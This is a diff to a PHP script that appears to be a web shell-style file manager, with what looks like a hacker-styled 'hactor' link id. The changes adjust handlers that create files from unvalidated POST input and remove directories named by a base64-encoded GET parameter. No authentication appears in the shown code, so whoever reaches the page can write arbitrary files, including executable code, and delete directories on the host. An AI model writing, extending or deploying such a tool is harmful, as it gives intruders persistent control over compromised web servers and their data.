@@ -47,32 +47,25 @@ function manager()
         break;
       case 'newfile':
         newfile();
+        break;
       case 'del':
-        if(!isset($_GET['dir']))
-        {
-          header("location:?do=home");
-        }
-        else
-        {
-          Delete($_GET['dir']);
-        }
+        if(isset($_GET['dir']))
+          rmdir(base64_decode($_GET['dir']));
+        echo "<script>window.location = '?do=home';</script>";
         break;
   }
 }
-function Delete($f)
-{
-  unlink($f);
-  header("location:?do=home");
-}
+
 function newfile()
 {
   echo "<center><div><form action='' method=post id=nf>File Will Be Saved in - <i><b>".getcwd()."</b></i><br><br>File name : <input id=l1 placeholder=file.txt autofocus name=fname><br><br><span style='vertical-align:top;'>File Contents : </span><textarea name=fdata id=l2 rows=5 cols=40></textarea><br><br><input type=submit value='Make File' name=make></form></div></center>";
   if(isset($_POST['make']))
   {
-    $file = fopen($_POST['fname'],"w");
+    $file = fopen(getcwd() . "/" .$_POST['fname'],"w");
     $data = $_POST['fdata'];
     fwrite($file,$data);
     fclose($file);
+    echo "<script>window.location = '?do=home';</script>";
   }
 }
 
@@ -91,7 +84,7 @@ function home()
     if($file[0]=="."){continue;}
     if(is_dir($file))
     {
-      echo "<tr><td>[ $file ]</td><td>".fileperms($file)."</td><td><pre><a href='?do=dnf&dir=".$cwd."' id=hactor>{New File}</a> <a href='?do=del&dir=".$cwd."' id=hactor>{Delete}</a> <a href='?do=ren&dir=".$cwd."' id=hactor>{Rename}</a></pre></td></tr>";
+      echo "<tr><td>[ $file ]</td><td>".fileperms($file)."</td><td><pre><a href='?do=dnf&dir=".base64_encode(realpath($file))."' id=hactor>{New File}</a> <a href='?do=dnf' id=hactor>{Open}</a> <a href='?do=del&dir=".base64_encode($cwd)."' id=hactor>{Delete}</a> <a href='?do=ren&dir=".$cwd."' id=hactor>{Rename}</a></pre></td></tr>";
     }
   }
   foreach ($files as $file) {
